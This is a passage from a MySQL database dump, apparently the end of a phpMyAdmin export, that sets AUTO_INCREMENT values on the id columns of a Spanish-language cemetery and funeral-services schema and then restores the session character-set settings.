ALTER TABLE `capacidades`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `cinerarios`
--
ALTER TABLE `cinerarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `componentes`
--
ALTER TABLE `componentes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=11;
--
-- AUTO_INCREMENT de la tabla `comunas`
--
ALTER TABLE `comunas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT de la tabla `condiciones`
--
ALTER TABLE `condiciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT de la tabla `construcciones`
--
ALTER TABLE `construcciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT de la tabla `cotizaciones`
--
ALTER TABLE `cotizaciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `destinatarios`
--
ALTER TABLE `destinatarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `empresas`
--
ALTER TABLE `empresas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `imagenes`
--
ALTER TABLE `imagenes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `mantenciones`
--
ALTER TABLE `mantenciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `materiales`
--
ALTER TABLE `materiales`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `periodos`
--
ALTER TABLE `periodos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `planes`
--
ALTER TABLE `planes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT de la tabla `regiones`
--
ALTER TABLE `regiones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=16;
--
-- AUTO_INCREMENT de la tabla `roles`
--
ALTER TABLE `roles`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT de la tabla `sedes`
--
ALTER TABLE `sedes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT de la tabla `sepultaciones`
--
ALTER TABLE `sepultaciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `servicios`
--
ALTER TABLE `servicios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT de la tabla `soluciones`
--
ALTER TABLE `soluciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `status`
--
ALTER TABLE `status`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `telefonos`
--
ALTER TABLE `telefonos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `terminaciones`
--
ALTER TABLE `terminaciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT de la tabla `tipo_construcciones`
--
ALTER TABLE `tipo_construcciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `tipo_empresas`
--
ALTER TABLE `tipo_empresas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT de la tabla `tipo_planes`
--
ALTER TABLE `tipo_planes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
--
-- AUTO_INCREMENT de la tabla `tipo_sepulturas`
--
ALTER TABLE `tipo_sepulturas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `tipo_soluciones`
--
ALTER TABLE `tipo_soluciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT de la tabla `tipo_ubicaciones`
--
ALTER TABLE `tipo_ubicaciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `traslados`
--
ALTER TABLE `traslados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `ubicaciones`
--
ALTER TABLE `ubicaciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT de la tabla `urnas`
--
ALTER TABLE `urnas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT de la tabla `velatorios`
--
ALTER TABLE `velatorios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
